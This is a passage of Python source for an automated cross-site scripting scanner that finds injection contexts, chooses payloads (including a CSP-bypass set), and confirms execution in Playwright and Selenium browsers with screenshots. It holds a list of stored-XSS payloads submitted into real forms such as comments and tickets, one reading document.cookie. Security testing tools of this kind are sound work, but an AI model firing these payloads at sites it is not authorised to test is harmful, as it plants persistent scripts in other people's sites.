                r'(?:href|src|action|data|formaction)\s*=\s*"[^"]*'
                + re.escape(marker),
                surroundings, re.IGNORECASE
            ):
                return self.CONTEXT_URL
            return self.CONTEXT_HTML_ATTR_DQ

        # Single-quoted attribute
        if re.search(r"=\s*'[^']*" + re.escape(marker), surroundings):
            if re.search(
                r"(?:href|src|action|data|formaction)\s*='[^']*"
                + re.escape(marker),
                surroundings, re.IGNORECASE
            ):
                return self.CONTEXT_URL
            return self.CONTEXT_HTML_ATTR_SQ

        # URL attribute (unquoted href/src/action/data)
        if re.search(
            r'(?:href|src|action|data|formaction)\s*=\s*[^"\'>\s]*'
            + re.escape(marker),
            surroundings, re.IGNORECASE
        ):
            return self.CONTEXT_URL

        # Unquoted attribute
        if re.search(r'=\s*' + re.escape(marker), surroundings):
            return self.CONTEXT_HTML_ATTR_UQ

        return self.CONTEXT_HTML_BODY

    def _narrow_to_diff(self, baseline: str, body: str,
                        marker: str, default_surroundings: str) -> str:
        """Attempt to narrow context by comparing baseline and injected response."""
        # Find lines that differ
        base_lines = baseline.splitlines()
        body_lines = body.splitlines()
        diff_lines = []
        for i, line in enumerate(body_lines):
            if i >= len(base_lines) or line != base_lines[i]:
                diff_lines.append(line)
        if diff_lines:
            diff_text = "\n".join(diff_lines)
            if marker in diff_text:
                idx = diff_text.find(marker)
                start = max(0, idx - 300)
                return diff_text[start:idx + len(marker) + 300]
        return default_surroundings

# ─────────────────────────────────────────────────────────────────────────────
# Payload selector
# ─────────────────────────────────────────────────────────────────────────────
class PayloadSelector:
    """Selects payloads appropriate for detected context, filter state, and CSP."""

    def select(self, context: str, char_filter: CharFilterResult,
               csp_present: bool = False,
               max_payloads: int = 0) -> list[str]:
        primary  = PAYLOADS.get(context, PAYLOADS["GENERIC"])
        fallback = PAYLOADS["GENERIC"]

        if csp_present:
            combined = list(dict.fromkeys(
                PAYLOADS["CSP_BYPASS"] + primary + fallback
            ))
        else:
            combined = list(dict.fromkeys(primary + fallback))

        viable: list[str] = []
        for payload in combined:
            required = self._required_chars(payload)
            if all(char_filter.is_available(c) for c in required):
                viable.append(payload)

        result = viable if viable else primary[:5]
        if max_payloads and max_payloads > 0:
            result = result[:max_payloads]
        return result

    def _required_chars(self, payload: str) -> list[str]:
        return [c for c in ["<", ">", "'", "\"", "(", ")"] if c in payload]

# ─────────────────────────────────────────────────────────────────────────────
# Heuristic scorer
# ─────────────────────────────────────────────────────────────────────────────
class HeuristicScorer:
    """
    Assigns a pre-browser confidence score to prioritise which parameters
    and payloads are worth attempting browser confirmation on.
    NOTE: This score is used only to filter candidates for browser testing.
          A finding is NEVER recorded based on score alone — a Playwright
          dialog event is the sole confirmation gate.
    """

    def score(
        self,
        context: str,
        payload: str,
        char_filter: CharFilterResult,
        response_body: str,
        payload_in_response: bool,
        csp_present: bool,
        reflection_type: ReflectionType = ReflectionType.RAW,
    ) -> int:
        s = 0

        # ── Reflection quality ──────────────────────────────────────────
        if payload_in_response:
            s += 30

        # Reflection type bonuses
        type_scores = {
            ReflectionType.RAW:         15,
            ReflectionType.ENCODED:      5,
            ReflectionType.TRANSFORMED:  8,
            ReflectionType.BLOCKED:      0,
        }
        s += type_scores.get(reflection_type, 0)

        # ── Injection context accuracy ──────────────────────────────────
        context_scores = {
            "HTML_BODY":          25,
            "HTML_ATTR_DOUBLE":   20,
            "HTML_ATTR_SINGLE":   20,
            "HTML_ATTR_UNQUOTED": 15,
            "JS_STRING_SINGLE":   20,
            "JS_STRING_DOUBLE":   20,
            "JS_BLOCK":           22,
            "URL":                18,
            "DOM":                15,
            "COMMENT":             5,
        }
        s += context_scores.get(context, 10)

        # ── Character survivability ─────────────────────────────────────
        critical  = ["<", ">", "(", ")"]
        survived  = sum(1 for c in critical if char_filter.is_available(c))
        s        += survived * 5

        # ── Sink relevance / payload-context match ──────────────────────
        if "script" in payload.lower() and context in ("HTML_BODY", "JS_BLOCK"):
            s += 10
        if "onerror" in payload.lower() and context == "HTML_BODY":
            s += 8
        if "onload" in payload.lower():
            s += 6
        if "alert" in payload and payload_in_response:
            s += 5

        # ── CSP restrictions ────────────────────────────────────────────
        if csp_present:
            s -= 15

        return max(0, min(s, 100))

# ─────────────────────────────────────────────────────────────────────────────
# Playwright availability probe
# ─────────────────────────────────────────────────────────────────────────────
def probe_playwright(logger: Logger) -> bool:
    try:
        old_fd2 = os.dup(2)
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, 2)
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-dev-shm-usage"]
                )
                browser.close()
            return True
        finally:
            os.dup2(old_fd2, 2)
            os.close(devnull)
            os.close(old_fd2)
    except Exception as e:
        logger.debug(f"Playwright probe failed: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# Full-screen screenshot capture utility
# ─────────────────────────────────────────────────────────────────────────────
def capture_fullscreen(path: str, logger: Optional[Logger] = None) -> bool:
    """
    Capture the entire primary monitor and save to *path*.
    Tries: Pillow ImageGrab → mss → platform CLI fallback.
    Returns True on success, False on failure.
    """
    # ── 1. Pillow ImageGrab (cross-platform) ───────────────────────────
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save(path)
        if os.path.isfile(path) and os.path.getsize(path) > 0:
            return True
    except ImportError:
        pass
    except Exception as e:
        if logger:
            logger.debug(f"Pillow ImageGrab failed: {e}")

    # ── 2. mss library (good on headless Xvfb) ─────────────────────────
    try:
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[0] if sct.monitors else None
            if monitor:
                shot = sct.grab(monitor)
                from mss.tools import to_png
                to_png(shot.rgb, shot.size, output=path)
                if os.path.isfile(path) and os.path.getsize(path) > 0:
                    return True
    except ImportError:
        pass
    except Exception as e:
        if logger:
            logger.debug(f"mss capture failed: {e}")

    # ── 3. Platform CLI fallback ────────────────────────────────────────
    system = platform.system()
    try:
        if system == "Linux":
            # scrot
            try:
                subprocess.run(
                    ["scrot", "-z", path],
                    check=True, timeout=15, capture_output=True
                )
                if os.path.isfile(path) and os.path.getsize(path) > 0:
                    return True
            except (FileNotFoundError, subprocess.CalledProcessError,
                    subprocess.TimeoutExpired):
                pass

            # gnome-screenshot
            try:
                subprocess.run(
                    ["gnome-screenshot", "-f", path],
                    check=True, timeout=15, capture_output=True
                )
                if os.path.isfile(path) and os.path.getsize(path) > 0:
                    return True
            except (FileNotFoundError, subprocess.CalledProcessError,
                    subprocess.TimeoutExpired):
                pass

        elif system == "Darwin":
            try:
                subprocess.run(
                    ["screencapture", "-x", path],
                    check=True, timeout=15, capture_output=True
                )
                if os.path.isfile(path) and os.path.getsize(path) > 0:
                    return True
            except (FileNotFoundError, subprocess.CalledProcessError,
                    subprocess.TimeoutExpired):
                pass

    except Exception as e:
        if logger:
            logger.debug(f"CLI screenshot fallback error: {e}")

    return False

# ─────────────────────────────────────────────────────────────────────────────
# Playwright browser validator
# ─────────────────────────────────────────────────────────────────────────────
class BrowserValidator:
    """
    Uses Playwright to confirm JavaScript execution in a sandboxed browser.

    Confirmation gate (strict, no false positives):
      A finding is confirmed IF AND ONLY IF a Playwright dialog event fires
      (alert / confirm / prompt / beforeunload).  Console events, DOM presence,
      and event-handler attributes are recorded as supplementary evidence
      strings but NEVER used to set confirmed=True on their own.

    Captures full-screen screenshots WITH the dialog box visible, and DOM
    snapshots for confirmed findings.  Screenshots and DOM snapshots are
    named with a monotonically increasing sequential prefix so that listing
    the output directory by name yields files in the exact order they were
    captured during the scan.
    """

    def __init__(self, logger: Logger,
                 snapshot_manager: SnapshotManager,
                 timeout: int = 8000,
                 auth_headers: Optional[dict] = None):
        self.log            = logger
        self.snapshot_mgr   = snapshot_manager
        self.timeout        = timeout
        self.auth_headers   = auth_headers or {}

    def _build_url(self, ip: InputPoint, payload: str) -> str:
        # For stored XSS, just navigate to the page directly
        if ip.param_type == "stored" or not payload:
            return ip.url

        parsed    = urllib.parse.urlparse(ip.url)
        clean_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        if ip.param_type in ("query", "runtime", "js"):
            qs = urllib.parse.urlencode({ip.param: payload})
            return f"{clean_url}?{qs}"
        elif ip.param_type == "form" and ip.method == "GET":
            body = deepcopy(ip.post_body)
            body[ip.param] = payload
            qs = urllib.parse.urlencode(body)
            return f"{clean_url}?{qs}"
        elif ip.param_type == "fragment":
            return f"{clean_url}#{urllib.parse.quote(payload, safe='')}"
        return clean_url

    def validate(
        self, ip: InputPoint, payload: str,
        post_data: Optional[dict] = None
    ) -> tuple[bool, str, Optional[str], Optional[str]]:
        """Returns (confirmed, evidence, screenshot_path, dom_snapshot_path).

        confirmed is True ONLY when a browser dialog event fires.
        """
        try:
            old_fd2 = os.dup(2)
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 2)

            result = self._run_browser(ip, payload, post_data)

            os.dup2(old_fd2, 2)
            os.close(devnull)
            os.close(old_fd2)
            return result
        except Exception as e:
            self.log.debug(f"Browser fd redirect error: {e}")
            return self._run_browser(ip, payload, post_data)

    def _run_browser(
        self, ip: InputPoint, payload: str,
        post_data: Optional[dict] = None
    ) -> tuple[bool, str, Optional[str], Optional[str]]:
        try:
            from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
        except ImportError:
            self.log.warning("Playwright not installed — browser validation skipped")
            return False, "Playwright not available", None, None

        # ── Tracking state ──────────────────────────────────────────────
        # dialogs   : dialog events fired by the page (alert/confirm/prompt)
        # extra_info: non-confirmation supplementary evidence strings
        dialogs:    list[str] = []
        extra_info: list[str] = []   # never sets confirmed=True

        confirmed              = False
        evidence               = ""
        screenshot             = None
        dom_snapshot           = None
        early_screenshot_path  = None   # screenshot captured while dialog is visible

        # ── Pre-compute a short hash uid for traceability in filenames ──
        file_uid = hashlib.md5(
            f"{ip.url}{ip.param}{payload}".encode()
        ).hexdigest()[:8]

        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=False,
                    args=["--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-web-security",
                          "--allow-running-insecure-content",
                          "--window-position=0,0",
                          "--window-size=1280,720"],
                )
                ctx_opts: dict = {"ignore_https_errors": True}

                extra = {**self.auth_headers, **ip.extra_headers}
                if extra:
                    ctx_opts["extra_http_headers"] = extra

                ctx  = browser.new_context(**ctx_opts,
                                           viewport={"width": 1280, "height": 720})
                page = ctx.new_page()
                page.set_default_timeout(self.timeout)

                # ── Bring browser window to foreground BEFORE navigation ─
                # This ensures the window is visible so that when the XSS
                # dialog fires, it will be on-screen and capturable.
                try:
                    page.bring_to_front()
                except Exception:
                    pass

                # ── Monitor dialog events (the ONLY confirmation signal) ─
                # CRITICAL: We capture the screenshot INSIDE the dialog
                # handler BEFORE dismissing the dialog.  This guarantees
                # the alert/confirm/prompt dialog box is visible on screen
                # when the screenshot is taken.
                def handle_dialog(dialog):
                    nonlocal early_screenshot_path
                    dialogs.append(f"{dialog.type}:{dialog.message}")

                    # ── Wait for dialog to be fully rendered on screen ───
                    # The dialog is already showing at this point, but we
                    # give the OS window manager a generous moment to
                    # composit and paint the dialog so it is guaranteed to
                    # appear in the fullscreen screenshot.
                    time.sleep(1.5)

                    # Ensure browser window is still in the foreground so
                    # the fullscreen capture includes it with the dialog.
                    try:
                        page.bring_to_front()
                        time.sleep(0.5)
                    except Exception:
                        pass

                    # ── Capture screenshot WITH dialog visible ───────────
                    sspath = self.snapshot_mgr.next_path(".png", file_uid)

                    # Fullscreen OS-level capture – includes the browser
                    # chrome and the native alert/confirm/prompt dialog.
                    captured = capture_fullscreen(sspath, self.log)

                    if not captured:
                        # Fallback: Playwright page screenshot.
                        # NOTE: page.screenshot() does NOT capture native
                        # browser dialogs (they are OS-level chrome), so
                        # the dialog box will likely NOT appear.  Still
                        # better than no screenshot at all.
                        self.log.debug(
                            "Fullscreen capture unavailable inside dialog "
                            "handler — falling back to page screenshot"
                        )
                        try:
                            page.screenshot(path=sspath, full_page=False)
                            captured = True
                        except Exception as ss_err:
                            self.log.debug(
                                f"Page screenshot inside dialog handler "
                                f"failed: {ss_err}"
                            )

                    if (captured
                            and os.path.isfile(sspath)
                            and os.path.getsize(sspath) > 0):
                        early_screenshot_path = sspath

                    # ── NOW dismiss the dialog to unblock the page ───────
                    dialog.dismiss()

                page.on("dialog", handle_dialog)

                # ── Monitor console events (informational only) ─────────
                # Console events are recorded as supplementary info but are
                # NEVER used to confirm a finding — they are too noisy and
                # commonly fired by legitimate page behaviour, 3rd-party
                # scripts, and browser internals, producing false positives.
                def handle_console(msg):
                    if msg.type in ("log",):
                        extra_info.append(f"console.{msg.type}:{msg.text[:200]}")

                page.on("console", handle_console)

                target_url = self._build_url(ip, payload)
                self.log.debug(f"Browser navigating: {target_url[:120]}")

                try:
                    if ip.method == "POST" and post_data:
                        page.goto(target_url,
                                  wait_until="domcontentloaded",
                                  timeout=self.timeout)
                        try:
                            for field_name, field_val in post_data.items():
                                selector = f'[name="{field_name}"]'
                                try:
                                    page.fill(selector, str(field_val),
                                              timeout=2000)
                                except Exception:
                                    pass
                            submitted = False
                            for submit_sel in [
                                "input[type=submit]",
                                "button[type=submit]",
                                "button",
                            ]:
                                try:
                                    page.click(submit_sel, timeout=2000)
                                    submitted = True
                                    break
                                except Exception:
                                    continue
                            if not submitted:
                                try:
                                    page.evaluate(
                                        "() => { const f = "
                                        "document.querySelector('form'); "
                                        "if(f) f.submit(); }"
                                    )
                                    submitted = True
                                except Exception:
                                    pass
                            if submitted:
                                page.wait_for_load_state(
                                    "domcontentloaded",
                                    timeout=self.timeout)
                        except Exception:
                            pass
                    else:
                        page.goto(target_url,
                                  wait_until="domcontentloaded",
                                  timeout=self.timeout)

                    page.wait_for_timeout(1500)

                    # ── Collect supplementary DOM info (informational) ───
                    # Presence of the payload or event handlers in the live
                    # DOM does NOT confirm execution — it only indicates
                    # that the payload reached the page.  True execution
                    # requires a dialog event to fire.
                    try:
                        dom_content = page.content()
                        if payload and payload in dom_content:
                            extra_info.append("Payload present in live DOM")
                        for trigger in ["onerror", "onload", "onfocus",
                                        "ontoggle"]:
                            if trigger in dom_content.lower():
                                extra_info.append(
                                    f"Event handler '{trigger}' found in live DOM"
                                )
                                break
                    except Exception:
                        pass

                except PWTimeout:
                    pass
                except Exception as nav_err:
                    self.log.debug(f"Navigation error: {nav_err}")

                # ── Confirmation: dialog event ONLY ─────────────────────
                if dialogs:
                    confirmed = True
                    evidence  = f"Dialog triggered: {dialogs[0]}"
                    # Append any supplementary info as additional context
                    if extra_info:
                        evidence += " | " + "; ".join(extra_info[:3])

                    # Use the screenshot captured while the dialog was
                    # still visible (taken inside handle_dialog).
                    screenshot = early_screenshot_path

                    # ── Fallback: if no early screenshot was captured ────
                    # (e.g. fullscreen capture was unavailable), take a
                    # page screenshot now.  The dialog will NOT be visible
                    # at this point (already dismissed), but it is still
                    # better than having no screenshot at all.
                    if not screenshot:
                        sspath = self.snapshot_mgr.next_path(".png", file_uid)

                        try:
                            page.bring_to_front()
                            page.wait_for_timeout(300)
                        except Exception:
                            pass

                        try:
                            page.screenshot(path=sspath, full_page=False)
                        except Exception:
                            pass

                        if (os.path.isfile(sspath)
                                and os.path.getsize(sspath) > 0):
                            screenshot = sspath

                    # ── DOM snapshot (dialog already dismissed, page ─────
                    # ── continues normally so content() is safe) ─────────
                    try:
                        snap_path = self.snapshot_mgr.next_path("_dom.html", file_uid)
                        dom_html = page.content()
                        with open(snap_path, "w", encoding="utf-8") as sf:
                            sf.write(dom_html)
                        dom_snapshot = snap_path
                    except Exception as e:
                        self.log.debug(f"DOM snapshot capture failed: {e}")

                else:
                    # Not confirmed — surface supplementary info for debug
                    if extra_info:
                        evidence = "Not confirmed. Supplementary: " + \
                                   "; ".join(extra_info[:3])
                    else:
                        evidence = "No dialog fired — not confirmed"

                ctx.close()
                browser.close()

        except Exception as e:
            self.log.debug(f"Browser validation error: {e}")
            evidence = str(e)

        return confirmed, evidence, screenshot, dom_snapshot

# ─────────────────────────────────────────────────────────────────────────────
# Stored XSS Scanner - Integrated Selenium-based testing
# ─────────────────────────────────────────────────────────────────────────────
class StoredXSSChecker:
    """
    Scanner for identifying Stored XSS vulnerabilities in Spider Hellhound output.
    This implementation uses Selenium WebDriver to perform automated testing
    by submitting payloads to forms and detecting triggered alerts.

    When a stored XSS is confirmed via Selenium, a Playwright‑based screenshot
    capture is performed (reusing the same steps) to obtain a full‑screen
    image of the browser with the alert dialog visible.

    NOTE ON TERMINAL OUTPUT: Confirmed findings discovered here are only
    logged at debug level while scanning is in progress. The single,
    user-facing "confirmed vulnerability" box for each finding is printed
    exactly once by the orchestrator (XSsDetector.run) after scan()
    returns, so a finding is never shown twice in the terminal.
    """

    def __init__(self, spider_data: dict, logger: Logger, http: HTTPClient,
                 snapshot_manager: SnapshotManager,
                 headless: bool = True):
        self.data = spider_data
        self.log = logger
        self.http = http
        self.endpoints = spider_data.get('endpoints', [])
        self.target = spider_data.get('meta', {}).get('target', 'Unknown')
        self.vulnerabilities = []
        self.observations = defaultdict(list)
        self.headless = headless
        self.driver = None
        self.confirmed_vulnerabilities = []
        self.snapshot_mgr = snapshot_manager

        # Common Stored XSS payloads for testing
        self.xss_payloads = [
            "<script>alert('XSS-STORED-1')</script>",
            "<img src=x onerror=alert('XSS-STORED-2')>",
            "<svg onload=alert('XSS-STORED-3')>",
            "javascript:alert('XSS-STORED-4')",
            "<body onload=alert('XSS-STORED-5')>",
            "<input onfocus=alert('XSS-STORED-6') autofocus>",
            "<iframe src=\"javascript:alert('XSS-STORED-7')\">",
            "'';!--\"<XSS>=&{()}",
            "<IMG SRC=\"javascript:alert('XSS-STORED-8');\">",
            "<IMG SRC=# onmouseover=\"alert('XSS-STORED-9')\">",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.domain)>"
        ]

        # Keywords suggesting data storage/display
        self.storage_keywords = [
            'feedback', 'comment', 'message', 'post', 'upload',
            'profile', 'review', 'rating', 'blog', 'article',
            'guestbook', 'forum', 'discussion', 'reply', 'ticket',
            'support', 'contact', 'inquiry', 'suggestion', 'survey'
        ]

        # File upload indicators
        self.upload_indicators = ['file', 'upload', 'attachment', 'document', 'image']

    def _initialize_driver(self) -> bool:
        """Initialize Selenium WebDriver with Firefox"""
        try:
            from selenium import webdriver
            from selenium.webdriver.firefox.service import Service
            from selenium.webdriver.firefox.options import Options
            from webdriver_manager.firefox import GeckoDriverManager

            # Set up Firefox options
            options = Options()
            if self.headless:
                options.add_argument('--headless')

            # Additional Firefox options for better compatibility
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.manager.showWhenStarting", False)
            options.set_preference("browser.download.dir", "/tmp")
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/octet-stream")
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference("useAutomationExtension", False)
            options.set_preference("dom.webnotifications.enabled", False)
            options.set_preference("dom.disable_beforeunload", True)
            options.set_preference("http.timeout", 30)
            options.set_preference("network.http.connection-timeout", 30)

            # Use webdriver_manager to handle GeckoDriver automatically
            service = Service(GeckoDriverManager().install())
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.set_page_load_timeout(15)
            self.driver.implicitly_wait(5)
            return True

        except Exception as e:
            self.log.debug(f"Failed to initialize Firefox driver: {e}")
            return False

    def _capture_playwright_screenshot(self, url: str, payload: str,
                                       form_fields: Dict[str, str],
                                       submit_selector: str = "input[type=submit]") -> Optional[str]:
        """
        Re‑run the stored XSS test using Playwright to capture a full‑screen
        screenshot with the alert dialog visible.  Returns the screenshot path
        on success, otherwise None.
        """
        try:
            from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
        except ImportError:
            self.log.debug("Playwright not available for screenshot capture")
            return None

        file_uid = hashlib.md5(f"{url}{payload}".encode()).hexdigest()[:8]
        screenshot_path = None

        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=False,
                    args=["--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-web-security",
                          "--allow-running-insecure-content",
                          "--window-position=0,0",
                          "--window-size=1280,720"],
                )
                ctx = browser.new_context(ignore_https_errors=True,
                                          viewport={"width": 1280, "height": 720})
                page = ctx.new_page()
                page.set_default_timeout(8000)

                # Bring window to front for screenshot
                try:
                    page.bring_to_front()
                except Exception:
                    pass

                # Dialog handler: capture screenshot then dismiss
                def handle_dialog(dialog):
                    nonlocal screenshot_path
                    # Wait for dialog to render
                    time.sleep(1.5)
                    try:
                        page.bring_to_front()
                        time.sleep(0.5)
                    except Exception:
                        pass

                    sspath = self.snapshot_mgr.next_path(".png", file_uid)
                    captured = capture_fullscreen(sspath, self.log)
                    if not captured:
                        try:
                            page.screenshot(path=sspath, full_page=False)
                            captured = True
                        except Exception:
                            pass
                    if captured and os.path.isfile(sspath) and os.path.getsize(sspath) > 0:
                        screenshot_path = sspath
                    dialog.dismiss()

                page.on("dialog", handle_dialog)

                # Navigate to the form page
                self.log.debug(f"Playwright screenshot: navigating to {url}")
                page.goto(url, wait_until="domcontentloaded", timeout=8000)

                # Fill form fields (including the payload)
                for name, value in form_fields.items():
                    selector = f'[name="{name}"]'
                    try:
                        page.fill(selector, str(value), timeout=2000)
                    except Exception:
                        pass

                # Submit the form
                submitted = False
                for sel in [submit_selector, "button[type=submit]", "button"]:
                    try:
                        page.click(sel, timeout=2000)
                        submitted = True
                        break
                    except Exception:
                        continue
                if not submitted:
                    try:
                        page.evaluate("() => { const f = document.querySelector('form'); if(f) f.submit(); }")
                        submitted = True
                    except Exception:
                        pass

                if submitted:
                    # Wait for navigation; the alert may fire during load
                    try:
                        page.wait_for_load_state("domcontentloaded", timeout=8000)
                    except PWTimeout:
                        pass
                # Give the page time to process and fire the alert
                page.wait_for_timeout(2000)

                # If no screenshot was captured (no alert?), we still try to capture the page
                if not screenshot_path:
                    sspath = self.snapshot_mgr.next_path(".png", file_uid)
                    try:
                        page.screenshot(path=sspath, full_page=False)
                        if os.path.isfile(sspath) and os.path.getsize(sspath) > 0:
                            screenshot_path = sspath
                    except Exception:
                        pass

                ctx.close()
                browser.close()

        except Exception as e:
            self.log.debug(f"Playwright screenshot capture error: {e}")
            return None

        return screenshot_path

    def scan(self) -> list[Finding]:
        """
        Main scanning method that analyzes all endpoints for Stored XSS risks
        """
        self.log.section("Stored XSS Detection (Selenium-based Automated Testing)")
        self.log.info(f"Analyzing target: {self.target}")
        self.log.info(f"Total endpoints to analyze: {len(self.endpoints)}")

        # Initialize driver for automated testing
        driver_initialized = self._initialize_driver()

        if driver_initialized:
            self.log.success("Firefox WebDriver initialized successfully")
            for endpoint in self.endpoints:
                self._analyze_and_test_endpoint(endpoint)
        else:
            self.log.warning("Running in static analysis mode only (no automated testing)")
            for endpoint in self.endpoints:
                self._analyze_endpoint_only(endpoint)

        # Close driver
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass

        # Return confirmed vulnerabilities as Findings (now with screenshots)
        return self._create_findings()

    def _analyze_and_test_endpoint(self, endpoint: Dict[str, Any]) -> None:
        """Analyze endpoint and perform automated XSS testing"""
        url = endpoint.get('url', '')
        method = endpoint.get('method', '')
        params = endpoint.get('params', [])
        form_fields = endpoint.get('form_fields_detail', [])
        observed_values = endpoint.get('observed_values', {})

        # Skip if no parameters or form fields
        if not params and not form_fields:
            return

        # Check if this endpoint stores data (POST with form fields)
        is_storage_endpoint = method == 'POST' and form_fields

        # Check for upload capability
        has_file_upload = endpoint.get('file_upload_candidate', False)
        if not has_file_upload:
            has_file_upload = any(
                field.get('file', False) or
                field.get('type') == 'file' or
                any(keyword in field.get('name', '').lower() for keyword in self.upload_indicators)
                for field in form_fields
            )

        # Check for storage-related keywords
        has_storage_context = any(
            keyword in url.lower() or
            any(keyword in field.get('name', '').lower() for field in form_fields)
            for keyword in self.storage_keywords
        )

        # Check for fields that might store data (text, textarea, etc.)
        text_fields = [
            field for field in form_fields
            if field.get('type') in ['text', 'textarea', 'email', 'search', 'url']
            and not field.get('hidden', False)
        ]

        # If it's a storage endpoint with text fields, test it
        if (is_storage_endpoint or has_storage_context) and text_fields:
            self._test_endpoint_for_xss(url, text_fields, form_fields)

        # Also test endpoints that might reflect data
        if params and not is_storage_endpoint:
            self._test_parameter_reflection(url, params)

    def _test_endpoint_for_xss(self, url: str, text_fields: List[Dict], form_fields: List[Dict]) -> None:
        """Test an endpoint for stored XSS by submitting payloads and checking for alerts"""
        self.log.debug(f"Testing {url} for stored XSS...")

        if not self.driver:
            return

        try:
            self.driver.get(url)
            time.sleep(2)  # Wait for page to load

            # Find all forms on the page
            from selenium.webdriver.common.by import By
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            if not forms:
                forms = self.driver.find_elements(By.CSS_SELECTOR, "form[action]")

            if not forms:
                self.log.debug(f"No forms found on {url}")
                return

            # For each form, try to submit XSS payloads
            for form_index, form in enumerate(forms):
                form_action = form.get_attribute("action")
                if not form_action:
                    continue

                # Get all input fields in this form
                inputs = form.find_elements(By.TAG_NAME, "input")
                textareas = form.find_elements(By.TAG_NAME, "textarea")
                all_fields = inputs + textareas

                if not all_fields:
                    continue

                # Test each payload
                for payload in self.xss_payloads[:5]:  # Test first 5 payloads to reduce time
                    try:
                        # Build a dict of field_name -> value for this submission
                        form_data = {}
                        for field in all_fields:
                            field_type = field.get_attribute("type")
                            field_name = field.get_attribute("name")
                            if field_type in ["text", "email", "search", "url", None] or field.tag_name == "textarea":
                                if self._is_likely_storage_field(field_name):
                                    form_data[field_name] = payload
                                    field.clear()
                                    field.send_keys(payload)
                            else:
                                # Keep default values for non‑text fields
                                if field_name:
                                    existing = field.get_attribute("value") or ""
                                    form_data[field_name] = existing

                        # Find submit button
                        submit_btn = None
                        submit_buttons = form.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                        if submit_buttons:
                            submit_btn = submit_buttons[0]

                        if submit_btn:
                            # Set up alert detection before clicking
                            self.driver.execute_script("""
                                window._xss_alerts = [];
                                window.original_alert = window.alert;
                                window.original_confirm = window.confirm;
                                window.original_prompt = window.prompt;

                                window.alert = function(msg) {
                                    window._xss_alerts.push(msg);
                                    return true;
                                };
                                window.confirm = function(msg) {
                                    window._xss_alerts.push(msg);
                                    return true;
                                };
                                window.prompt = function(msg) {
                                    window._xss_alerts.push(msg);
                                    return null;
                                };

                                window.original_console_log = console.log;
                                console.log = function(msg) {
                                    if (typeof msg === 'string' && (msg.includes('XSS') || msg.includes('alert'))) {
                                        window._xss_alerts.push('Console: ' + msg);
                                    }
                                    window.original_console_log(msg);
                                };
                            """)

                            # Click submit button
                            submit_btn.click()
                            time.sleep(3)  # Wait for response and potential alerts

                            # Check for alerts
                            alerts = self.driver.execute_script("return window._xss_alerts || []")

                            if alerts:
                                # Alert triggered! This is a confirmed XSS.
                                # We now capture a Playwright screenshot.
                                screenshot_path = self._capture_playwright_screenshot(
                                    url=url,
                                    payload=payload,
                                    form_fields=form_data,
                                    submit_selector="input[type=submit]"
                                )

                                self._record_confirmed_vulnerability(
                                    url,
                                    "stored_xss",
                                    payload,
                                    alerts,
                                    form_action,
                                    [f.get_attribute("name") for f in all_fields if f.get_attribute("name")],
                                    screenshot_path
                                )
                                break  # Found vulnerability, no need to test more payloads
                    except Exception as e:
                        continue

        except Exception as e:
            self.log.debug(f"Error testing {url}: {str(e)}")

    def _test_parameter_reflection(self, url: str, params: List[str]) -> None:
        """Test if parameters are reflected in the response"""
        self.log.debug(f"Testing parameter reflection on {url}...")

        if not self.driver:
            return

        try:
            from selenium.webdriver.common.by import By

            # Test first few parameters
            for param in params[:3]:
                for payload in self.xss_payloads[:2]:
                    test_url = url + "?" + param + "=" + payload
                    self.driver.get(test_url)
                    time.sleep(1)

                    # Check if payload appears in page source
                    page_source = self.driver.page_source
                    if payload in page_source:
                        # Check if it triggers alert
                        self.driver.execute_script("""
                            window._xss_alerts = [];
                            window.alert = function(msg) {
                                window._xss_alerts.push(msg);
                                return true;
                            };
                        """)

                        # Execute the payload if it's in the page
                        if "<script>" in payload:
                            try:
                                self.driver.execute_script(payload)
                            except Exception:
                                pass

                        alerts = self.driver.execute_script("return window._xss_alerts || []")

                        if alerts:
                            # For reflected parameters, we could also capture screenshot,
                            # but the current requirement is for stored XSS only.
                            # We'll still record it.
                            self._record_confirmed_vulnerability(
                                url,
                                "reflected_xss",
                                payload,
                                alerts,
                                url,
                                [param],
                                None  # no screenshot for reflected in this module
                            )
                            break
        except Exception as e:
            self.log.debug(f"Error testing parameter reflection: {str(e)}")

    def _is_likely_storage_field(self, field_name: str) -> bool:
        """Determine if a field is likely to store user data"""
        if not field_name:
            return True  # If no name, assume it might store data

        field_name_lower = field_name.lower()

        # Check against storage keywords
        for keyword in self.storage_keywords:
            if keyword in field_name_lower:
                return True

        # Exclude non-storage fields
        non_storage_keywords = ['csrf', 'token', 'captcha', 'password', 'confirm', 'action']
        for keyword in non_storage_keywords:
            if keyword in field_name_lower:
                return False

        return True

    def _record_confirmed_vulnerability(self, url: str, vuln_type: str, payload: str,
                                         alerts: List[str], action_url: str,
                                         fields: List[str], screenshot_path: Optional[str] = None):
        """Record a confirmed vulnerability.

        NOTE: This method intentionally does NOT print a user-facing finding
        box. It only logs at debug level. The single, canonical terminal
        announcement for each finding happens once in XSsDetector.run()
        after scan() completes and the finding has passed the
        orchestrator's de-duplication check — this is what prevents Stored
        XSS findings from being printed twice.
        """
        vulnerability = {
            'url': url,
            'vulnerability_type': vuln_type,
            'payload': payload,
            'triggered_alerts': alerts,
            'action_url': action_url,
            'affected_fields': fields,
            'risk_score': 85,  # High confidence
            'risk_level': 'HIGH',
            'confidence': 'CONFIRMED',
